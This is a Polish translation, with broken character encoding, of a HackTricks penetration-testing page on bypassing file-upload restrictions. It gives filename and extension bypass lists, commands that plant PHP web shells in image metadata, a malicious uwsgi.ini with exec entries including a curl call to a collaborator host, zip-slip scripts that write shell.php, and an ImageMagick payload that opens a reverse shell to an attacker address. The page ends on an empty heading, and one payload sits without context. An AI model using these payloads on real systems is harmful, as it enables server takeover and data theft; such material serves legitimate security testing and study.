# WysyÅ‚anie plikÃ³w

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

JeÅ›li interesuje CiÄ™ **kariera hakerska** i hakowanie niemoÅ¼liwego - **rekrutujemy!** (_wymagana biegÅ‚a znajomoÅ›Ä‡ jÄ™zyka polskiego, zarÃ³wno pisanego, jak i mÃ³wionego_).

{% embed url="https://www.stmcyber.com/careers" %}

## OgÃ³lna Metodologia WysyÅ‚ania PlikÃ³w

Inne przydatne rozszerzenia:

* **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Praca w PHPv8**: _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
* **Flash**: _.swf_
* **Perl**: _.pl, .cgi_
* **Serwer WWW Erlang Yaws**: _.yaws_

### Ominiecie sprawdzania rozszerzeÅ„ plikÃ³w

1. JeÅ›li stosujÄ… siÄ™, **sprawdÅº poprzednie rozszerzenia**. Testuj je rÃ³wnieÅ¼ uÅ¼ywajÄ…c **wielkich liter**: _pHp, .pHP5, .PhAr ..._
2. _SprawdÅº **dodanie prawidÅ‚owego rozszerzenia przed** rozszerzeniem wykonawczym (uÅ¼yj rÃ³wnieÅ¼ poprzednich rozszerzeÅ„):_
* _file.png.php_
* _file.png.Php5_
3. SprÃ³buj dodaÄ‡ **znaki specjalne na koÅ„cu.** MoÅ¼esz uÅ¼yÄ‡ Burp do **prÃ³by siÅ‚owej** wszystkich znakÃ³w **ascii** i **Unicode**. (_ZauwaÅ¼, Å¼e moÅ¼esz rÃ³wnieÅ¼ sprÃ³bowaÄ‡ uÅ¼yÄ‡ **wczeÅ›niej** wspomnianych **rozszerzeÅ„**_)
* _file.php%20_
* _file.php%0a_
* _file.php%00_
* _file.php%0d%0a_
* _file.php/_
* _file.php.\\_
* _file._
* _file.php...._
* _file.pHp5...._
4. SprÃ³buj ominÄ…Ä‡ zabezpieczenia **oszukujÄ…c analizator rozszerzeÅ„** po stronie serwera za pomocÄ… technik takich jak **podwajanie** **rozszerzenia** lub dodawanie **Å›mieciowych** danych (bajty **null**) miÄ™dzy rozszerzeniami. _MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **poprzednich rozszerzeÅ„** do przygotowania lepszego Å‚adunku._
* _file.png.php_
* _file.png.pHp5_
* _file.php#.png_
* _file.php%00.png_
* _file.php\x00.png_
* _file.php%0a.png_
* _file.php%0d%0a.png_
* _file.phpJunk123png_
5. Dodaj **kolejnÄ… warstwÄ™ rozszerzeÅ„** do poprzedniej kontroli:
* _file.png.jpg.php_
* _file.php%00.png%00.jpg_
6. SprÃ³buj umieÅ›ciÄ‡ **rozszerzenie wykonawcze przed prawidÅ‚owym rozszerzeniem** i miej nadziejÄ™, Å¼e serwer jest Åºle skonfigurowany. (przydatne do wykorzystania bÅ‚Ä™dÃ³w konfiguracji Apache, gdzie cokolwiek z rozszerzeniem **.php**, ale niekoniecznie koÅ„czÄ…ce siÄ™ na .php\*\* bÄ™dzie wykonywaÄ‡ kod):
* _np. file.php.png_
7. UÅ¼ywanie **alternatywnego strumienia danych NTFS (ADS)** w **Windows**. W tym przypadku po niedozwolonym rozszerzeniu i przed dozwolonym zostanie wstawiony znak dwukropka ":". W rezultacie na serwerze zostanie utworzony **pusty plik z niedozwolonym rozszerzeniem** (np. "file.asax:.jpg"). Ten plik moÅ¼e byÄ‡ pÃ³Åºniej edytowany za pomocÄ… innych technik, takich jak korzystanie z jego krÃ³tkiej nazwy pliku. Wzorzec "**::$data**" moÅ¼e rÃ³wnieÅ¼ byÄ‡ uÅ¼ywany do tworzenia niepustych plikÃ³w. Dlatego dodanie kropki po tym wzorcu moÅ¼e byÄ‡ rÃ³wnieÅ¼ przydatne do ominiÄ™cia dalszych ograniczeÅ„ (np. "file.asp::$data.")
8. SprÃ³buj zÅ‚amaÄ‡ limity nazwy pliku. PrawidÅ‚owe rozszerzenie zostaje odciÄ™te, a zÅ‚oÅ›liwy kod PHP pozostaje. AAA<--SNIP-->AAA.php

```
# Maksymalnie 255 bajtÃ³w w systemie Linux
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # odejmij 4 i dodaj .png
# PrzeÅ›lij plik i sprawdÅº odpowiedÅº, ile znakÃ³w pozwala. ZaÅ‚Ã³Å¼my 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# UtwÃ³rz Å‚adunek
AAA<--SNIP 232 A-->AAA.php.png
```
### OminiÄ™cie typu zawartoÅ›ci, numeru magicznego, kompresji i zmiany rozmiaru

* OminiÄ™cie sprawdzania **typu zawartoÅ›ci** przez ustawienie **wartoÅ›ci** nagÅ‚Ã³wka **Content-Type** na: _image/png_, _text/plain_, _application/octet-stream_
1. **SÅ‚ownik typÃ³w zawartoÅ›ci**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* OminiÄ™cie sprawdzania **numeru magicznego** poprzez dodanie na poczÄ…tku pliku **bajtÃ³w rzeczywistego obrazu** (myli polecenie _file_). Lub wprowadÅº powÅ‚okÄ™ w **metadanych**:\
`exiftool -Comment="<?php echo 'Polecenie:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub moÅ¼na rÃ³wnieÅ¼ **wprost wprowadziÄ‡ Å‚adunek** w obrazie:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* JeÅ›li do twojego obrazu jest dodawana **kompresja**, na przykÅ‚ad za pomocÄ… standardowych bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), poprzednie techniki nie bÄ™dÄ… przydatne. MoÅ¼esz jednak uÅ¼yÄ‡ **kawaÅ‚ka PLTE** [**technika zdefiniowana tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) do wstawienia tekstu, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* Strona internetowa moÅ¼e rÃ³wnieÅ¼ **zmieniaÄ‡ rozmiar obrazu**, uÅ¼ywajÄ…c na przykÅ‚ad funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. MoÅ¼esz jednak uÅ¼yÄ‡ **kawaÅ‚ka IDAT** [**technika zdefiniowana tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) do wstawienia tekstu, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Inna technika umoÅ¼liwiajÄ…ca utworzenie Å‚adunku, ktÃ³ry **przetrwa zmianÄ™ rozmiaru obrazu**, to uÅ¼ycie funkcji PHP-GD `thumbnailImage`. MoÅ¼esz jednak uÅ¼yÄ‡ **kawaÅ‚ka tEXt** [**technika zdefiniowana tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) do wstawienia tekstu, ktÃ³ry **przetrwa kompresjÄ™**.
* [**Github z kodem**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Inne sztuczki do sprawdzenia

* ZnajdÅº podatnoÅ›Ä‡ umoÅ¼liwiajÄ…cÄ… **zmianÄ™ nazwy** juÅ¼ przesÅ‚anego pliku (aby zmieniÄ‡ rozszerzenie).
* ZnajdÅº podatnoÅ›Ä‡ na **Lokalne WÅ‚Ä…czenie Pliku** do wykonania backdoor.
* **MoÅ¼liwe ujawnienie informacji**:
1. PrzeÅ›lij **kilka razy** (i **jednoczeÅ›nie**) ten **sam plik** o **tej samej nazwie**
2. PrzeÅ›lij plik o **nazwie** pliku lub **folderu**, ktÃ³ry **juÅ¼ istnieje**
3. PrzeÅ›lij plik o nazwie **â€œ.â€, â€œ..â€ lub â€œâ€¦â€**. Na przykÅ‚ad w Apache w **Windows**, jeÅ›li aplikacja zapisuje przesÅ‚ane pliki w katalogu â€œ/www/uploads/â€, nazwa pliku â€œ.â€ utworzy plik o nazwie â€œuploadsâ€ w katalogu â€œ/www/â€.
4. PrzeÅ›lij plik, ktÃ³ry moÅ¼e byÄ‡ trudno usuniÄ™ty, taki jak **â€œâ€¦:.jpgâ€** w **NTFS**. (Windows)
5. PrzeÅ›lij plik w **Windows** z **nieprawidÅ‚owymi znakami** takimi jak `|<>*?â€` w nazwie. (Windows)
6. PrzeÅ›lij plik w **Windows** uÅ¼ywajÄ…c **zarezerwowanych** (**zakazanych**) **nazw** takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 i LPT9.
* SprÃ³buj rÃ³wnieÅ¼ **przesÅ‚aÄ‡ plik wykonywalny** (.exe) lub **.html** (mniej podejrzany), ktÃ³ry **wykona kod** po przypadkowym otwarciu przez ofiarÄ™.

### Specjalne sztuczki z rozszerzeniami

JeÅ›li prÃ³bujesz przesÅ‚aÄ‡ pliki do serwera **PHP**, [sprawdÅº sztuczkÄ™ z plikiem **.htaccess** do wykonania kodu](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
JeÅ›li prÃ³bujesz przesÅ‚aÄ‡ pliki do serwera **ASP**, [sprawdÅº sztuczkÄ™ z plikiem **.config** do wykonania kodu](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` sÄ… jak pliki `.jar` dla Javy, ale dla PHP, i mogÄ… byÄ‡ **uÅ¼ywane jak plik php** (wykonywane z php lub doÅ‚Ä…czane do skryptu...)

Rozszerzenie `.inc` jest czasami uÅ¼ywane dla plikÃ³w php, ktÃ³re sÅ‚uÅ¼Ä… tylko do **importowania plikÃ³w**, wiÄ™c w pewnym momencie ktoÅ› mÃ³gÅ‚ pozwoliÄ‡ na **wykonanie tego rozszerzenia**.

## **Jetty RCE**

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik XML do serwera Jetty, moÅ¼esz uzyskaÄ‡ [RCE, poniewaÅ¼ **nowe pliki \*.xml i \*.war sÄ… automatycznie przetwarzane**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** WiÄ™c, jak wspomniano na poniÅ¼szym obrazie, przesÅ‚aj plik XML do `$JETTY_BASE/webapps/` i czekaj na powÅ‚okÄ™!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1044).png>)

## **uWSGI RCE**

Dla szczegÃ³Å‚owego zbadania tej podatnoÅ›ci sprawdÅº oryginalne badania: [Eksploatacja uWSGI RCE](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

PodatnoÅ›ci na zdalne wykonanie kodu (RCE) mogÄ… byÄ‡ wykorzystane w serwerach uWSGI, jeÅ›li ktoÅ› ma moÅ¼liwoÅ›Ä‡ modyfikacji pliku konfiguracyjnego `.ini`. Pliki konfiguracyjne uWSGI wykorzystujÄ… okreÅ›lonÄ… skÅ‚adniÄ™ do uwzglÄ™dniania "magicznych" zmiennych, zastÄ™pcÃ³w i operatorÃ³w. Warto zauwaÅ¼yÄ‡, Å¼e operator '@', uÅ¼ywany jako `@(nazwa_pliku)`, sÅ‚uÅ¼y do doÅ‚Ä…czania zawartoÅ›ci pliku. WÅ›rÃ³d rÃ³Å¼nych obsÅ‚ugiwanych schematÃ³w w uWSGI, schemat "exec" jest szczegÃ³lnie potÄ™Å¼ny, umoÅ¼liwiajÄ…c odczytywanie danych z wyjÅ›cia standardowego procesu. Ta funkcja moÅ¼e byÄ‡ manipulowana w celach niecnych, takich jak zdalne wykonanie kodu lub zapis/odczyt plikÃ³w, gdy plik konfiguracyjny `.ini` jest przetwarzany.

RozwaÅ¼ poniÅ¼szy przykÅ‚ad szkodliwego pliku `uwsgi.ini`, prezentujÄ…cego rÃ³Å¼ne schematy:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie Å‚adunku nastÄ™puje podczas analizy pliku konfiguracyjnego. Aby konfiguracja zostaÅ‚a aktywowana i sparsowana, proces uWSGI musi zostaÄ‡ zrestartowany (potencjalnie po awarii lub w wyniku ataku typu Denial of Service) lub plik musi byÄ‡ ustawiony do automatycznego przeÅ‚adowania. Funkcja automatycznego przeÅ‚adowania, jeÅ›li jest wÅ‚Ä…czona, przeÅ‚adowuje plik w okreÅ›lonych odstÄ™pach czasu po wykryciu zmian.

Niezwykle istotne jest zrozumienie luÅºnego charakteru analizy pliku konfiguracyjnego uWSGI. W szczegÃ³lnoÅ›ci omawiany Å‚adunek moÅ¼e byÄ‡ wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo poszerza zakres potencjalnej eksploatacji.

## **Sztuczka z przesyÅ‚aniem plikÃ³w/SSRF za pomocÄ… wget**

W niektÃ³rych sytuacjach moÅ¼esz zauwaÅ¼yÄ‡, Å¼e serwer uÅ¼ywa **`wget`** do **pobierania plikÃ³w** i moÅ¼esz **okreÅ›liÄ‡** **URL**. W takich przypadkach kod moÅ¼e sprawdzaÄ‡, czy rozszerzenie pobieranych plikÃ³w znajduje siÄ™ na biaÅ‚ej liÅ›cie, aby zapewniÄ‡, Å¼e pobierane sÄ… tylko dozwolone pliki. JednakÅ¼e, **to sprawdzenie moÅ¼na ominÄ…Ä‡.**\
Maksymalna dÅ‚ugoÅ›Ä‡ **nazwy pliku** w systemie **linux** wynosi **255**, jednakÅ¼e **wget** skraca nazwy plikÃ³w do **236** znakÃ³w. MoÅ¼esz **pobraÄ‡ plik o nazwie "A"\*232+".php"+".gif"**, ta nazwa pliku **omija** **sprawdzenie** (jak w tym przykÅ‚adzie **".gif"** to **poprawne** rozszerzenie), ale `wget` **zmieni nazwÄ™** pliku na **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - â€˜AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.phpâ€™ saved [10/10]
```
ZauwaÅ¼, Å¼e **innÄ… opcjÄ…**, o ktÃ³rej moÅ¼esz myÅ›leÄ‡, aby ominÄ…Ä‡ tÄ™ kontrolÄ™, jest sprawienie, Å¼e **serwer HTTP przekieruje do innego pliku**, wiÄ™c poczÄ…tkowy URL ominie kontrolÄ™, a nastÄ™pnie wget pobierze przekierowany plik pod nowÄ… nazwÄ…. To **nie zadziaÅ‚a**, **chyba Å¼e** wget jest uÅ¼ywany z **parametrem** `--trust-server-names`, poniewaÅ¼ **wget pobierze przekierowanÄ… stronÄ™ pod nazwÄ… pliku wskazanÄ… w oryginalnym URL-u**.

## NarzÄ™dzia

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) to potÄ™Å¼ne narzÄ™dzie zaprojektowane do pomocy Pentesterom i Åowcom BÅ‚Ä™dÃ³w w testowaniu mechanizmÃ³w przesyÅ‚ania plikÃ³w. Wykorzystuje rÃ³Å¼ne techniki nagrÃ³d za bÅ‚Ä™dy, aby uproszczaÄ‡ proces identyfikacji i wykorzystywania podatnoÅ›ci, zapewniajÄ…c dokÅ‚adne oceny aplikacji internetowych.

## Od przesyÅ‚ania plikÃ³w do innych podatnoÅ›ci

* Ustaw **nazwÄ™ pliku** na `../../../tmp/lol.png` i sprÃ³buj osiÄ…gnÄ…Ä‡ **trawersowanie Å›cieÅ¼ki**
* Ustaw **nazwÄ™ pliku** na `sleep(10)-- -.jpg` i byÄ‡ moÅ¼e uda ci siÄ™ osiÄ…gnÄ…Ä‡ **wstrzykniÄ™cie SQL**
* Ustaw **nazwÄ™ pliku** na `<svg onload=alert(document.domain)>` aby osiÄ…gnÄ…Ä‡ XSS
* Ustaw **nazwÄ™ pliku** na `; sleep 10;` aby przetestowaÄ‡ wstrzykniÄ™cie poleceÅ„ (wiÄ™cej [sztuczek wstrzykiwania poleceÅ„ tutaj](../command-injection.md))
* [**XSS** w przesyÅ‚anym pliku obrazu (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* PrzesyÅ‚anie pliku **JS** + **XSS** = [Eksploatacja **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE w przesyÅ‚anym svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Przekierowanie otwarte** poprzez przesyÅ‚anie pliku svg](../open-redirect.md#open-redirect-uploading-svg-files)
* WyprÃ³buj **rÃ³Å¼ne Å‚adunki svg** z [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Znana podatnoÅ›Ä‡ **ImageTrick**](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* JeÅ›li moÅ¼esz **wskazaÄ‡ serwerowi internetowemu, aby przechwyciÅ‚ obraz z adresu URL**, moÅ¼esz sprÃ³bowaÄ‡ naduÅ¼yÄ‡ [SSRF](../ssrf-server-side-request-forgery/). JeÅ›li ten **obraz** ma byÄ‡ **zapisany** na jakiejÅ› **publicznej** stronie, moÅ¼esz rÃ³wnieÅ¼ wskazaÄ‡ adres URL z [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **ukraÅ›Ä‡ informacje o kaÅ¼dym odwiedzajÄ…cym**.
* [**XXE i CORS** bypass z przesyÅ‚aniem pliku PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* Specjalnie przygotowane pliki PDF do XSS: [NastÄ™pna strona przedstawia, jak **wstrzyknÄ…Ä‡ dane PDF, aby uzyskaÄ‡ wykonanie JS**](../xss-cross-site-scripting/pdf-injection.md). JeÅ›li moÅ¼esz przesÅ‚aÄ‡ pliki PDF, moÅ¼esz przygotowaÄ‡ pewne pliki PDF, ktÃ³re wykonajÄ… dowolny JS, postÄ™pujÄ…c zgodnie z podanymi wskazÃ³wkami.
* PrzeÅ›lij zawartoÅ›Ä‡ \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) aby sprawdziÄ‡, czy serwer ma **antywirusa**
* SprawdÅº, czy istnieje jakieÅ› **ograniczenie rozmiaru** przesyÅ‚anych plikÃ³w

Oto lista 10 rzeczy, ktÃ³re moÅ¼esz osiÄ…gnÄ…Ä‡ poprzez przesyÅ‚anie (z [tutaj](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: WstrzykniÄ™cie CSV
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : WstrzykniÄ™cie HTML / XSS / Przekierowanie otwarte
8. **PNG / JPEG**: Atak zalewania pikseli (DoS)
9. **ZIP**: RCE poprzez LFI / DoS
10. **PDF / PPTX**: SSRF / Åšlepa XXE

#### Rozszerzenie Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## Magiczne bajty nagÅ‚Ã³wka

* **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG**: `"\xff\xd8\xff"`

Odniesienie do [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) dla innych typÃ³w plikÃ³w.

### Automatyczne dekompresowanie plikÃ³w Zip/Tar podczas przesyÅ‚ania

JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik ZIP, ktÃ³ry zostanie zdekompresowany na serwerze, moÅ¼esz zrobiÄ‡ 2 rzeczy:

#### Symlink

PrzeÅ›lij link zawierajÄ…cy miÄ™kkie linki do innych plikÃ³w, a nastÄ™pnie, uzyskujÄ…c dostÄ™p do zdekompresowanych plikÃ³w, uzyskasz dostÄ™p do poÅ‚Ä…czonych plikÃ³w:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Dekompresuj w rÃ³Å¼nych folderach

Niespodziewane tworzenie plikÃ³w w katalogach podczas dekompresji stanowi istotny problem. Pomimo poczÄ…tkowych zaÅ‚oÅ¼eÅ„, Å¼e taka konfiguracja moÅ¼e chroniÄ‡ przed wykonaniem poleceÅ„ na poziomie systemu operacyjnego poprzez zÅ‚oÅ›liwe przesyÅ‚anie plikÃ³w, hierarchiczne wsparcie dla kompresji i moÅ¼liwoÅ›ci nawigacji po katalogach formatu archiwum ZIP mogÄ… byÄ‡ wykorzystane. Pozwala to atakujÄ…cym ominÄ…Ä‡ ograniczenia i uciec z bezpiecznych katalogÃ³w przesyÅ‚ania poprzez manipulowanie funkcjonalnoÅ›ciÄ… dekompresji docelowej aplikacji.

Automatyczny exploit do tworzenia takich plikÃ³w jest dostÄ™pny na [**evilarc na GitHubie**](https://github.com/ptoomey3/evilarc). NarzÄ™dzie moÅ¼na uÅ¼yÄ‡ w nastÄ™pujÄ…cy sposÃ³b:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **szalony trik z symlinkiem z evilarc** jest opcjÄ…. JeÅ›li celem jest docelowy plik np. `/flag.txt`, naleÅ¼y utworzyÄ‡ symlink do tego pliku w systemie. Zapewnia to, Å¼e evilarc nie napotyka bÅ‚Ä™dÃ³w podczas swojej operacji.

PoniÅ¼ej znajduje siÄ™ przykÅ‚ad kodu w jÄ™zyku Python uÅ¼ywanego do utworzenia zÅ‚oÅ›liwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Wykorzystywanie kompresji do rozprzestrzeniania plikÃ³w**

Aby uzyskaÄ‡ wiÄ™cej informacji, **sprawdÅº oryginalny post na**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Tworzenie powÅ‚oki PHP**: Kod PHP jest napisany w celu wykonania poleceÅ„ przekazanych za pomocÄ… zmiennej `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2. **Rozprzestrzenianie plikÃ³w i tworzenie skompresowanego pliku**: Tworzone sÄ… multiple pliki, a nastÄ™pnie jest tworzony archiwum zip zawierajÄ…ce te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3. **Modyfikacja za pomocÄ… edytora heksadecymalnego lub vi**: Nazwy plikÃ³w wewnÄ…trz archiwum zip sÄ… zmieniane za pomocÄ… vi lub edytora heksadecymalnego, zamieniajÄ…c "xxA" na "../" w celu przemieszczania siÄ™ po katalogach.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie powÅ‚oki PHP w pliku PNG

